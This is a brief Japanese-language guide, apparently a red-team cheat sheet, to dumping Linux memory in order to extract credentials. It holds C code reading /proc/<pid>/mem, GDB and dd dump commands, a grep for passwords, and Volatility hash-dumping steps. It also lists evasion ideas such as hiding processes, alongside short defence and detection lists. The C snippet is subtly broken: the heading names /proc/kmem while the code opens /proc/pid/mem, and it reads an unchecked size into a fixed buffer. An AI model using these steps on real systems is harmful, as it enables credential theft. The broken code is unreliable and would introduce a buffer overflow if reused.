# Linux Memory Dumping Techniques

**対応OS**: Linux

## 概要
Linuxシステムからメモリ内のクレデンシャルを抽出する手法について解説します。

## 基本的な手法

### /proc/kmemを使用したメモリダンプ
```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

void dump_memory(pid_t pid, unsigned long addr, size_t size)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    
    int fd = open(path, O_RDONLY);
    if (fd == -1) return;
    
    char buffer[4096];
    lseek(fd, addr, SEEK_SET);
    read(fd, buffer, size);
    close(fd);
}
```

### GDBを使用したメモリダンプ
```bash
# プロセスにアタッチ
gdb -p <PID>

# メモリ領域のダンプ
dump memory output.dump <start_addr> <end_addr>

# クレデンシャル関連の文字列検索
strings output.dump | grep -i "password"
```

### volatilityを使用した解析
```bash
# メモリイメージの取得
dd if=/dev/mem of=memory.dump bs=1M

# Linuxプロファイルの作成
vol.py --info | grep Linux

# プロセスリストの取得
vol.py -f memory.dump --profile=LinuxProfile linux_pslist

# クレデンシャルの抽出
vol.py -f memory.dump --profile=LinuxProfile linux_hashdump
```

## 検知回避テクニック
- プロセス隠蔽
- メモリアクセスの分散
- 特権昇格の回避
- ファイルシステム操作の隠蔽

## 防御策
- /proc/メモリアクセスの制限
- SELinuxポリシーの強化
- プロセスの監視
- メモリ保護機能の有効化

## 検知方法
- 不審なメモリアクセス
- 特権プロセスの監視
- ファイルシステム操作の監視
- システムコールの追跡

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 